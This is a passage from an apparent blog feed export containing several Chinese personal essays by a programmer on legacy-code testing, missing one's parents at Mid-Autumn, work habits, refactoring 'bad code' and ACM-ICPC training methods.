就会有足够的测试用例，这除了使得老代码的功能可以更健壮，也使得我们对老代码更有信心，无需再过度担心维护代码时带来的副作用。</p><p>打个比方，举重运动员为了变得更健壮，日积月累地训练，终于使得腿部筋腱开始出现断裂。不过他认为持续的锻炼会使自己最终适应这种痛苦。但正如他每次下蹲都要忍受疼痛一样，没有测试用例的老代码在各种新功能附加的重压之下也开始出现扭曲、变形。后来医生告诉他应该重点做康复锻炼，因为只有在复健后，他的肌肉会变得更结实、能够承担更多重量。同样地，针对老代码的既有功能补充测试用例，可以使得老代码更健壮，当以后交接到别人手上的时候，重构的呼声自然也就会减少了。</p><p>不过有的时候，我们拿到手的老代码是已经有一定的测试用例的了，它们也能运行成功，但是这些测试却对理解老代码毫无帮助——有些测试是为了图方便而建立的，它们之所以能运行成功，是因为这些测试都是在假设代码能够顺利运行的理想情况下建立的——我们不需要这种花瓶式的测试用例。</p><p>其实最理想的情况，就是测试用例可以完全覆盖老代码，但实际上不可能——我们也不需要那样做——字典上单词都是用到时才去查的，测试用例也一样，不然你有看到过谁把字典背下来了吗？</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 心路历程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 重构 </tag>
            
            <tag> 随笔 </tag>
            
            <tag> 测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>月缺，梦圆。</title>
      <link href="/articles/insights/yue-que-meng-yuan/"/>
      <url>/articles/insights/yue-que-meng-yuan/</url>
      
        <content type="html"><![CDATA[<p>又是一年中秋时。</p><p>你多久没回家看过父母了？</p><p>……</p><p>一个星期？一个月？抑或，一年？ </p><p>……</p><p>每个孩子从小都有一个愿望：独立。殊不知是狭隘的独立。年少的我们总是向往无拘无束的自由，而这种又总是单纯地诱使我们离开家里。于是选择远一点的地方念书，便成为了最简单的方法。而我，也不例外。</p><p>在我还在读书那会，我不怎么喜欢回家，纯粹只是因为怕麻烦。</p><p>那时候每个节日对我的意义，无非就是一个休息的日子——不管是春节也好，中秋也罢。虽然都会回家一趟看看父母，但总有一种“循例”的感觉在左右。“每逢佳节倍思亲”，那时的我，其实体会不深。</p><p>然后，就毕业了。</p><p>世事往往发生在意料之外、却又意料之中的无能为力。我因为工作来到了广州，可是昔日的同窗好友，却是一个都不在这里。或许只有到了真正举目无亲的时候，那种在语文课本念了几百遍的思乡情怀才真的会油然而生吧。</p><p>我又怎么想到有一天，回家，也会变成一种奢侈。</p><p>父母总是喜欢把我的前途放在首位，每次我打电话回家，跟父母说大概什么时候回去的时候，电话那头总是说：工作要紧，没时间就不用回了。我回家的时候，经常只能待1天、甚至更短，但只要我回去了，他们都会很开心。其实时间长短又何妨，我不过希望可以带回去一份心意，而已。</p><p>或许是成长总会带来一些自负，毕业的时候，我就跟自己说不会再问家里拿1分钱。因为我没有再依赖父母的理由，也没有资格去依赖他们。但是每次在家的时候，父亲总是问我钱够不够花，母亲则总是做一桌子我喜欢的菜。——他们都怕我一个人过得不好。</p><p>其实一个人又有什么所谓好不好的。我隐约觉得，我依赖了父母20年，父母又何尝不是依赖了我20年。只是我突然有一天真的离开了父母，不用他们照顾了，他们少了一份念想，觉得不习惯吧。我现在唯一可以告诉他们的，就是我过得很好，仅此而已。</p><p>我不怕被父母依赖。倒不如说，我希望有能力被父母依赖。早几年前开始，家里的大小事，父亲都会跟我商量。我那时候总跟父亲说：爸，你喜欢就好了，怎么决定我都没意见。有一次我母亲跟我谈到这个，她跟我说：你爸现在谁都不信，最信就是你……。我那天真的觉得，父母真的都已经老了。</p><p>算上大四那年，我出来工作已经一年多了，每次回到窝里，总是空荡荡的，总有种失落感。说真的，我比较怀念上中学的日子，起码每次回家都能看见父母，只悔那时不懂珍惜。</p><p>经常有人问我：你现在工作的地方跟家里那么近，回家不也是很方便吗？是很方便。但是物理上的距离再短，也是距离。影响沟通的距离。这种距离在心里累积起来，会变成难以驱散的孤独感，我不希望父母承受那种孤独感。</p><p>现在虽然父母嘴上不说，但是我知道他们总盼我什么时候能回家，可以见上一面，但又总是怕会烦叨我，没敢叫我回家。这种滋味不好受。所以我现在的愿望，就是可以把父母接到身边，安享晚年。至少，可以让他们少了一份牵挂。“父母在，不远游”，把父母留在家里，是我心头的一根刺。</p><p>之前在网上看过一篇文章：假设父母都能活到100岁，可等到我们工作的时候，他们的人生已经过半了。剩下50年，如果我们每年只回家1次，那也只能再见父母50次而已。我不知道这种日子还能有多长。但我希望在还没有失去的时候，可以好好地珍惜它。</p><p>中秋不过是个传统，我们不应该为了过中秋而过中秋。平时哪怕再忙，也应该常回家看看，好好想想自己的父母、家人。有些恩情，是我们穷尽一辈子都还不了的。</p><p>……</p><p>月有阴晴圆缺。</p><p>但愿人长久，千里共婵娟。</p><p>……</p><p>最后的最后，愿大家中秋阖家团圆，愿天下父母幸福安康。</p><p><img src="./01.png" alt="月亮总是可以把一瞬间的思念，化作永恒…"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 心路历程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>请发展你的惰性</title>
      <link href="/articles/insights/qing-fa-zhan-ni-de-duo-xing/"/>
      <url>/articles/insights/qing-fa-zhan-ni-de-duo-xing/</url>
      
        <content type="html"><![CDATA[<p>你工作的时候就只是工作吗？</p><p>我不一定。我有些时候不会把今天的所有时间都用在为了完成今天的工作任务中。而且我也相信，把全部时间都花费在工作并不代表就能很好地完成工作。</p><p>作为一个程序员，我上班时出现过的状态不外乎是三种，如果以键盘作为计量单位，那就是：不停地敲键盘、偶尔敲键盘、和不敲键盘。状态一基本就是忙于开发任务的时候，状态二一般就是调试代码的时候，而状态三就是在做跟当前工作没有直接关联的事情的时候。</p><p>如果把状态一和状态二视为对忠于工作任务的韧性，那么状态三应该就是我对工作的惰性了。不过于我而言，一和二不外乎都是体力劳动的一种，只能使我做完工作，但三却能帮我做好工作。</p><p>众所周知，程序员是脑力工作者，我们的价值在于如何运用我们的脑细胞。同样都是为工作的需求写代码，一套考虑周全的代码总比为了应付工作而写的代码生命力更持久，其维护难度也更低。其实IT行业发展至今，先辈们积累了无数这方面的知识，并作为可利用的财富流传下来，而我至今所学的也不过是沧海一粟。因此我比较喜欢看一些前人总结的经验心得，作为我忙中偷闲的乐趣，而契机不过是恰好工作有需要、或是偶尔的突发奇想罢了。</p><p>并非我们在开发和调试的过程中学不到东西，只不过这些大部分都只能够作为我们自身的经验被积累下来。要把经验转化为知识，是需要时间去顿悟的。相较之下，直接去累积前人有价值的知识，化为己用更为便捷。于当下确实是花费了一点工时，而且也未必对目前的工作任务起到关键性的作用，但之后总有其发挥价值的时候，这我深有体会。</p><p>当然，我对工作的这种惰性，有一部分是源于我对职业的兴趣，这也是使得我能够保持不疲于工作的心态的原因之一。虽然对当下工作任务而言，这种惰性有点不公，但我觉得对以后的工作、乃至于职业而言却是有好处的。</p><p>惰性是一种慢热型的能力，未必适用于所有人。即使要发展惰性，各人方向或许也有所不同，不过都应该要知道把握尺度，不要影响到相关工作的完成质量，毕竟惰性的发展并不是能够对工作不负责的借口。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 心路历程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>优雅的烂代码</title>
      <link href="/articles/insights/you-ya-de-lan-dai-ma/"/>
      <url>/articles/insights/you-ya-de-lan-dai-ma/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">/** * ┌───┐   ┌───┬───┬───┬───┐ ┌───┬───┬───┬───┐ ┌───┬───┬───┬───┐ ┌───┬───┬───┐ * │Esc│   │ F1│ F2│ F3│ F4│ │ F5│ F6│ F7│ F8│ │ F9│F10│F11│F12│ │P/S│S L│P/B│  ┌┐    ┌┐    ┌┐ * └───┘   └───┴───┴───┴───┘ └───┴───┴───┴───┘ └───┴───┴───┴───┘ └───┴───┴───┘  └┘    └┘    └┘ * ┌───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───────┐ ┌───┬───┬───┐ ┌───┬───┬───┬───┐ * │~ `│! 1│@ 2│# 3│$ 4│% 5│^ 6│&amp; 7│* 8│( 9│) 0│_ -│+ =│ BacSp │ │Ins│Hom│PUp│ │N L│ / │ * │ - │ * ├───┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─────┤ ├───┼───┼───┤ ├───┼───┼───┼───┤ * │ Tab │ Q │ W │ E │ R │ T │ Y │ U │ I │ O │ P │{ [│} ]│ | \ │ │Del│End│PDn│ │ 7 │ 8 │ 9 │   │ * ├─────┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴─────┤ └───┴───┴───┘ ├───┼───┼───┤ + │ * │ Caps │ A │ S │ D │ F │ G │ H │ J │ K │ L │: ;│" '│ Enter  │               │ 4 │ 5 │ 6 │   │ * ├──────┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴────────┤     ┌───┐     ├───┼───┼───┼───┤ * │ Shift  │ Z │ X │ C │ V │ B │ N │ M │&lt; ,│> .│? /│  Shift   │     │ ↑ │     │ 1 │ 2 │ 3 │   │ * ├─────┬──┴─┬─┴──┬┴───┴───┴───┴───┴───┴──┬┴───┼───┴┬────┬────┤ ┌───┼───┼───┐ ├───┴───┼───┤ E││ * │ Ctrl│    │Alt │         Space         │ Alt│    │    │Ctrl│ │ ← │ ↓ │ → │ │   0   │ . │←─┘│ * └─────┴────┴────┴───────────────────────┴────┴────┴────┴────┘ └───┴───┴───┘ └───────┴───┴───┘ */</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>敏捷开发是当下软件开发的主流模式之一，为了摒弃以往瀑布式开发带来的弊端，敏捷开发推崇在团队中以个人为单位进行简单的模块化开发，它更注重的是团队间的沟通和模块间的衔接。</p><p>为了使代码层面上的沟通更便捷，一套套的编码规范和设计模式应运而生，毫无疑问，使用这些规范模式会使得我们的代码看起来更优雅，经验也证明这更有利于团队沟通。</p><p>对于经验丰富的程序员而言，针对某种功能使用合理的设计模式编写出规范的代码、并提供满足功能调用的接口，可能是易如反掌的事。但每个团队中都不可避免的会存在生涩的程序员，例如我。对我而言这种方式就并不完全是这么回事了。</p><p>即使我作为一个项目经验如何不足的程序员，独立开发一个简单功能模块的能力还是具备的。经常在编写代码之前，我脑中已有完整的思路，我可以很清晰地向别人陈述我的编程思想，我也很有信心可以把这些思想变成代码。但事实上这可能比我想象的要难得多。很多时候我发现我花费了比预期更多的时间，却无法写出一段可执行的代码。因为我在编码的时候，想得更多的不是如何去实现这个功能，而是如何让别人更舒服地看懂我的代码。</p><p>虽然很多开发团队都强调代码的优雅性，但这是以“可运行性”为前提的。这种过分放大观赏性代码的地位，本就是本末倒置的行为。优雅只是交流的辅助手段，但不是唯一的手段。</p><p>事实上，如果仅是实现需求的功能，而不去考虑任何外因，我确信我可以很快地写出一段可运行的“烂代码”。烂代码与优雅代码相比，最表面的区别可能仅是可读性差而已。而且团队开发很多时候并不需要关心别人开发的功能是如何实现的，这些优雅性的问题自然也不会被马上指出来了。</p><p>当然，我并不是倡导每个人都去写烂代码。烂代码只是一个过度的产物，考虑到以后代码的维护性和可扩展性，必须在烂代码保证功能需求后，对其进行重构。而往往优雅地重构自己既成的代码，很可能要比优雅地写出构思中的代码要容易得多。</p><p>摒弃优雅性的约束，烂代码使得开发过程更轻松、耗用资源更少、编程的目的性更强。其实这与敏捷开发的部分理念恰好是一致的：有目的指向的简单构建、有辅助指向的重构勇气。这正是烂代码的优雅之道。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">/** * 頂頂頂頂頂頂頂頂頂　頂頂頂頂頂頂頂頂頂 * 頂頂頂頂頂頂頂　　　　　頂頂　　　　　 * 　　　頂頂　　　頂頂頂頂頂頂頂頂頂頂頂 * 　　　頂頂　　　頂頂頂頂頂頂頂頂頂頂頂 * 　　　頂頂　　　頂頂　　　　　　　頂頂 * 　　　頂頂　　　頂頂　　頂頂頂　　頂頂 * 　　　頂頂　　　頂頂　　頂頂頂　　頂頂 * 　　　頂頂　　　頂頂　　頂頂頂　　頂頂 * 　　　頂頂　　　頂頂　　頂頂頂　　頂頂 * 　　　頂頂　　　　　　　頂頂頂　 * 　　　頂頂　　　　　　頂頂　頂頂　頂頂 * 　頂頂頂頂　　　頂頂頂頂頂　頂頂頂頂頂 * 　頂頂頂頂　　　頂頂頂頂　　　頂頂頂頂 */</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 心路历程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 敏捷开发 </tag>
            
            <tag> 沟通 </tag>
            
            <tag> 重构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>程序员的&quot;病态&quot;</title>
      <link href="/articles/insights/cheng-xu-yuan-de-bing-tai/"/>
      <url>/articles/insights/cheng-xu-yuan-de-bing-tai/</url>
      
        <content type="html"><![CDATA[<p>每个程序员都是从菜鸟过来的，而菜鸟的成长之路总是崎岖的。不断地碰壁、不断地摸索、不断地成长，从中难免衍生出各种各样的“病态”，而这其实都是我们切实作为一个程序员的证明。</p><h2 id="密集空间恐惧症"><a href="#密集空间恐惧症" class="headerlink" title="密集空间恐惧症"></a>密集空间恐惧症</h2><p>这应是程序员的通病了。不知道是谁的谎言：“程序员每天的工作就是看着一堆01代码”，这想着都会令人疯掉吧。每个程序员最怕看到的，就是那些一堆堆没换行没缩进的代码，更何况是一堆01代码。</p><p>如果一个程序员说他没有密集空间恐惧症，那他一定就是这堆代码的创始人之一了。我不理解为什么总有一些程序员要乐此不疲地代替编译器把代码中的空字符删去，编码规范出现的初衷，很可能就是为了对付这些程序员的——即使我忘记了我曾经或许也是他们中的一员。</p><h2 id="强迫症"><a href="#强迫症" class="headerlink" title="强迫症"></a>强迫症</h2><p>一些程序员在开发一个新项目的时候，会考虑太多情况，例如这种代码在以后的运行是否稳定、维护是否方便等。尤其是有一点项目经验但又不足、而且是完美主义者的程序员，在写代码的过程中会不断地考虑设计文档没有的东西，然后就很忘我地在项目代码上画蛇添足。</p><p>往往强迫自己写一个完美的程序的人，其现实就是：由于客观因素影响（如项目工时不足），导致最后提交的代码中出现太多没有被实现的抽象方法，结果反而是自己给自己挖了一堆无法填补的坑。</p><h2 id="神经质"><a href="#神经质" class="headerlink" title="神经质"></a>神经质</h2><p>基本上每个正常的程序员都有点神经质的。一个显著的特点就是：我们对自己的代码充满信心、但看到别人的代码都会疑神疑鬼，习惯性地认为那有BUG，然后千方百计地将其找出来。如果有能力把BUG修复，还会因此感到非常有成就感，尽管那个BUG是无关痛痒的。</p><p>程序界有一个“潜规则”：每个程序中 80% 的 BUG 都是别人发现的。这跟程序员的神经质应是脱不了干系了。</p><h2 id="妄想症"><a href="#妄想症" class="headerlink" title="妄想症"></a>妄想症</h2><p>大部分程序员最初接触到一些已经投入使用、但看上去写得很差的项目代码时，就会开始妄想自己的能力，认为自己可以用最好的技术去重写它。由于是一时冲动，欠缺考虑因素太多（如背景、支撑环境等），往往都是失败告终。</p><p>其唯一的好处可能就是在重写的过程中，可能确实学到了一些未能投入使用的新技术，仅此而已。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 心路历程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>工作需要经营</title>
      <link href="/articles/insights/gong-zuo-xu-yao-jing-ying/"/>
      <url>/articles/insights/gong-zuo-xu-yao-jing-ying/</url>
      
        <content type="html"><![CDATA[<p>转眼间我已实习了3个月有余，在这期间，相比于精通什么技能或业务，我更学会了应该如何去经营自己的工作。</p><p>我深深体会到工作并不是做好自己的份内事就足够的。单纯的努力工作，那只是为了谋生所付出的劳动；用心去经营的工作，才有可能会变成自己的事业。</p><h2 id="智于心，慧于行：审视自己的工作模式"><a href="#智于心，慧于行：审视自己的工作模式" class="headerlink" title="智于心，慧于行：审视自己的工作模式"></a>智于心，慧于行：审视自己的工作模式</h2><p>在公司里面，我被告知得更多的是如何去改善自己的工作模式，其中最倡导的是尽可能避免无意义的重复劳动。确实，平时与我们工作打交道的是各种各样的数据，要逐一去处理这些本质一样而问题各异的数据，无疑是事倍功半的行为。</p><p>好的工作模式，不仅可以提升工作效率，使我们逃离无意义劳动的怪圈，还可以实现公司价值和自身价值的双赢。而工作模式的优化，关键在于不断积累的经验。</p><p>例如平时可以多留一个心眼，把新的想法或遇到的问题进行记录，这样日积月累下来，在遇到新的问题时就不至于手忙脚乱，甚至可以利用以往类似的处理经验，达到事半功倍的效果。</p><p>不过，有好的想法固然不错，但更重要的是将其付诸行动，找到一种属于自己的工作模式，而不仅仅是纸上谈兵。</p><h2 id="慎言笃行：真诚做人，踏实做事"><a href="#慎言笃行：真诚做人，踏实做事" class="headerlink" title="慎言笃行：真诚做人，踏实做事"></a>慎言笃行：真诚做人，踏实做事</h2><p>“真诚做人，踏实做事”，这其实也就是我入职时了解到的企业文化之一。</p><p>做事先做人，人脉关系是经营工作的必修课。在我看来，交际圈的尺寸，与能否诚心待人是正相关的。但无论与他人相处如何，都必须谨慎言行，视场合说话。语言是把双刃剑，所谓“祸从口出”，当不知道说什么的时候，既不是阿谀奉承，也不应论人是非——不逞口舌之快，有时踏踏实实多做事，远比一切语言更具说服力。</p><p>想起我刚入职的时候，就接到了一个特殊“任务”：必须在限期内认识组内所有同事，并让他们认识我。这确实不是一个好差事，因为当时我连组内有哪些人都不清楚，就是说我连自我介绍的对象都没有……不过也不知是我人缘好还是面皮厚，这个任务最后还是完成了。</p><p>而现在的我已经结识不少其他部门的同事了，在这段期间，受到了非常多同事的包容和照顾，其实我能够这么快融入公司，离不开同事之间的良好氛围。我都甚至觉得，我的人际关系，其实是大家帮我经营起来的。</p><h2 id="云在青天水在瓶：心态决定位置"><a href="#云在青天水在瓶：心态决定位置" class="headerlink" title="云在青天水在瓶：心态决定位置"></a>云在青天水在瓶：心态决定位置</h2><p>这其实是我比较信奉的一句座右铭。云和水都是同一种物质，但是它们的形态决定了它们所处的位置。但也不应该因为身处青天而自傲，因为身处瓶中而自卑。</p><p>在职期间，我并不是所有工作都一帆风顺，我也因为规范性事故受过批评、被扣过绩效。后来也因为工作表现好而受到了表扬和奖励。但其实我个人看待事情的心态是比较淡薄的，我不会随便自暴自弃，也不会骄傲自负。我觉得既然是自己的问题，就应该承认并纠正，逃避并不是解决问题的方法；而对于嘉许，平常心看待即可。</p><p>我觉得相比于工作模式和人脉培养，工作其实更依赖于内心的修养。一份良好的心态，在一定程度上可以反映出以后工作的发展空间、以及对挫折的承受能力，甚至为自己提供了一个精神支持。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 心路历程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一位 ACMer 过来人的心得</title>
      <link href="/articles/insights/yi-wei-acmer-guo-lai-ren-de-xin-de/"/>
      <url>/articles/insights/yi-wei-acmer-guo-lai-ren-de-xin-de/</url>
      
        <content type="html"><![CDATA[<p>刻苦的训练我打算最后稍微提一下。主要说后者：什么是有效地训练？</p><p>我想说下我的理解。</p><p>很多ACMer入门的时候，都被告知：要多做题，做个500多道就变牛了。其实，这既不是充分条件、也不会是必要条件。</p><p>我觉得一般情况下，对于我们普通学校的大学生，各方面能力的差距不会太大，在这种情况下，训练和学习的方法尤为重要。</p><p>其实，500题仅仅是一个标志，而且仅仅表示你做 ACM-ICPC 有一定的时间。</p><p>我们训练的目的是什么？我觉得有四点：</p><ul><li>提高编程能力</li><li>学习算法（读书，读论文，包括做一些题目验证）</li><li>准备好面临将到来的挑战（熟悉题型，调整心态）</li><li>启发思维</li></ul><p>这里四个目的，从训练的角度上，重要性逐次递减；为什么呢？</p><p>因为前面的因素是后面的基础。而是后面的目的，想达成越为不易。我觉得前3者能保证你ac掉你能做的题，即使难题始终不会做，也可以ac掉中等偏难的题目。</p><p>而需要一定思维难度的题，要以前三者为基础而且属于训练的后期，中期只能作为偶尔调节。当然，我思维也烂得要死，对这点没什么发言权，大家可以鄙视我。</p><p>我这里想主要说下第2点。</p><p>对于算法，我发现，很多我们这样的弱校ACMer选手没有侧重好算法的学习。</p><p>下面要讲的几点，可能都很老套，但我想以035对比我自己的例子给大家做说明。</p><h2 id="算法学习是ACM比赛所要推广或者要提倡的一个方面"><a href="#算法学习是ACM比赛所要推广或者要提倡的一个方面" class="headerlink" title="算法学习是ACM比赛所要推广或者要提倡的一个方面"></a>算法学习是ACM比赛所要推广或者要提倡的一个方面</h2><p>记得曾经路过某人的blog，上面说他作比赛的时候遇到了一个dijkstra，他没做出来，然后评论到（大意）：我才不会花时间去搞明白“这种”算法。 “这种”也许有可能是指：没什么实用性，对吧，这样我就不想评论了（又是有关科学和工程的讨论）。但起码有一点需要明确的：ACM-ICPC比赛时关于计算机科学的比赛，计算机科学是算法的科学，计算机算法中dijkstra有着重要的实际和启发意义，所以比赛一定要考。</p><p>你参加这个比赛，要拿奖，就必须学习这种算法。你也许觉得你智商很高，但ACM-ICPC比赛本身不是智力比赛，比赛就是要让你去学习这些东西，所以，如果你不想学的话，我觉得也没有必要参加。说道这，可能偏题有点远，但是希望以上的分析能得出这样一个基础结论：不想学好算法，那没有必要来比赛。</p><h2 id="用模板是不好的"><a href="#用模板是不好的" class="headerlink" title="用模板是不好的"></a>用模板是不好的</h2><p>现在很多我们弱校的ACM-ICPC选手比较依赖模板，说实话，我也很依赖，但是我起码知道一点，这样是不对的，某种意义上说，这是你没有把算法学明白的一种表现。而且也严重影响编码速度。在我见过的huicpc035参加过的比赛中，他从来没有看过模板，全部现场敲，有一次比赛有个图强连通分量+缩点+染色+什么的题去了，我在他们机房做，我则抄模板，结果总共敲了1个半小时，而035明确算法之后，啪啦啪啦，估计30多分钟就敲完了。这里顺便八卦一下他：我和kevin以前去湖大集训队玩的时候，给他取了个外号——打字猛男（他应该还不知道）。因为他敲键盘的声音特别大特别快，呵呵。</p><p>我觉得他敲代码的时间没有浪费，某牛曾说：因为每次敲都有可能有不同的错误，所以不用模板是好习惯。我最开始学dancing link的的时候，自己敲出了代码，然后接下来的几道题部分参考了以前的代码，后来基本上是直接copy。现在，当别人问我dancing link算法或有关的题目的时候，我已经是一脸茫然。</p><p>所以，用模板是不好的，有时候由于某些原因可能你用了模板，但你起码要知道这要做是不对的，并且有机会要改正。</p><h2 id="需要深入学习"><a href="#需要深入学习" class="headerlink" title="需要深入学习"></a>需要深入学习</h2><p>像 ACRush、zzy、ahyangyi…等等国家队的天才们，本身难以说我们与他们之间有什么可比性。但是他们的学习方法应该还是值得借鉴的，他们的学习方法当然我们得不到言传身教，但是从他们在国家队集训的论文中和他们搞完ACM-ICPC以后的轨迹中，可以有所体现。那就是：深入学习。</p><p>其实这点我来讲可能还是不够有力，因为我这方面也很欠缺，我尽量说下我的想法。</p><p>首先，觉得ACMer学算法不应停留在看看代码实现这个层面，在算法思想上要有清醒的认识，在正确性分析上要也应该要有较好的逻辑。因为网上的代码的实现上的一些细枝末节很可能掩盖了算法本身有的简洁性、美感和思想。因而丧失了对算法整体上的一些认识。还拿dijkstra算法打比方，有些算法不是基于 dijskstra的直接建模，而是需要你修改这个算法，这时你对算法没有真正理解的话，也就一筹莫展了。</p><p>我为什么老说Dijkstra算法，因为确实很多人都只知道用模板，而且模板还不好，在我看到的Dijkstra实现中，只有czyuan_acm的代码写得好。不是说其他的不对，但确实是有问题，投机取巧了的。</p><p>所以，要阅读论文和书籍，尤其与英文书籍，窥到它的本质。另一方面，只有这样，你学的的东西才能在ACM-ICPC以外，给你一定的启发——否则你会迅速忘掉它的。</p><p>据我所知，035起码阅读了几十篇集训队论文，orzorzorz，而且切掉了例题。</p><h2 id="独立思考"><a href="#独立思考" class="headerlink" title="独立思考"></a>独立思考</h2><p>这点我也很惭愧，因为我也是缺乏独立思考的。很多题我不会了就去搜解题报告，所以反而我的搜资料能力变得特别强。035和许多大牛在这点上做的比我好多了，他们遇到题不会的时候，也不会很急于把题目做出来，可能每隔一段时间又拿出来想一次，总有一天想通了，之后这一类型的题目基本上也就没有什么问题了。</p><p>而我恰恰比较“虚荣”，做到的题目不会不太愿意想太久，就想尽量快些AC，于是急于看解题报告，这样导致的一个问题就是有些重要的东西解题报告中没有提到，而我也没去想就把他们忽略了，这样，我还是不会做。我和035讨论问题的时候，我不会一般就直接找他要代码，但是他不懂的时候，顶多问我大体的思路，而绝对不会要代码的。</p><p>在去年ACM赛区尾声的时候，我发现035做中难题的能力已经明显超过我一个档次。看他现在做的题目，已然是相当变态，几乎是都100以下人ac，这些题目我看了基本上没什么想法，更要命的时，解题报告也搜不到。035目前的状态让我想起一个人，不知道大家知道不：wangfangbob，他切bt题的能力也是令人汗颜的。</p><h2 id="做有意义的题"><a href="#做有意义的题" class="headerlink" title="做有意义的题"></a>做有意义的题</h2><ul><li>不要做水题，这里的水题定义为：一眼就能看出做法，而且中途的实现可以预计没有太多问题的题目。</li><li>做能够强化你最近学到的东西的题目</li><li>你不会但你应该会的题目</li></ul><p>这同时也是在说，某些没太多代表性的题目可以少做，因为对比赛帮助不大。（当然我这个参加比赛的目的很功利，非功利主义者另当别论）刚才，我把我在poj上的号和他的号对比了下，他ac而我没ac的基本上是难题，我ac他没ac的一般是水题，看得我想哭，5555。</p><p>补充一点：ac的人多的并不一定代表着水题，有些几千人ac的题目，在现场赛中ac的人很少，这样的题目往往是有一定思维难度且编码不难的好题，这种题目要认真做，某个学长说：经典的题目啊，只有那么多，做一道，就少一道。</p><h2 id="估算好某种训练所需要的时间"><a href="#估算好某种训练所需要的时间" class="headerlink" title="估算好某种训练所需要的时间"></a>估算好某种训练所需要的时间</h2><p>我觉得我学网络流就是一个例子，我在大概赛区赛之前2个月开始学习网络流，1个月前开始学习费用流，但是对于我来讲，这两个月培养出来的网络流思维还是不够（虽然也做了不少题），特别是，这种题目往往作为中难的题目出现，不会让你随便水的，于是，北京赛区的那道网络流当时就没有想出来——功利地说，学习网络流没有得到好的效果。</p><p>所以，现在来看，当时其实我可以不搞网络流。如果要学一种比较有难度的东西，并且还必须把他搞好，应该较早地，全面地学习，必须长期的训练以培养这种思维。打个比方，如果你微积分平时不学，仅仅考试前一周狂做题目，我觉得上90分是很困难的。</p><p>当然，这要根据个人情况而定，我的理解能力应该说是中等水平，如果牛的话应该可以更快地学好。</p><h2 id="有关训练的度"><a href="#有关训练的度" class="headerlink" 